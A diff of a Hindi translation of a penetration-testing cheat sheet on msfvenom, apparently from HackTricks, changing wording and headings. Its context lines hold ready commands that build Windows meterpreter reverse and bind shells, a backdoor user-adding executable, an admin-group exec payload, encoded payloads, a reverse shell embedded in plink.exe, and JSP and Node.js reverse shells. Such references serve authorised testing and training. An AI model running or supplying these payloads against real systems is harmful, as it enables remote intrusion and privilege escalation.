@@ -1,12 +1,14 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
 ## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-`-a` का उपयोग payload architecture चुनने के लिए और `--platform` का उपयोग उसके target platform को चुनने के लिए करें।<sup>[[1]](#references)</sup>
+Payload architecture चुनने के लिए `-a` और target platform चुनने के लिए `--platform` का उपयोग करें।<sup>[[1]](#references)</sup>
 
 ## Listing
 ```bash
@@ -23,7 +25,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-यहाँ दिखाए गए flags bad characters, output format, encoder और encoding iterations चुनते हैं।<sup>[[1]](#references)</sup>
+यहाँ दिखाए गए flags bad characters, output format, encoder और encoding iterations का चयन करते हैं।<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -35,7 +37,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### User बनाएं
+### User बनाना
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### executable के अंदर embedded
+### Executable में Embedded
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script भाषा payloads**
+## **Script Language payloads**
 
 ### **Perl**
 ```bash
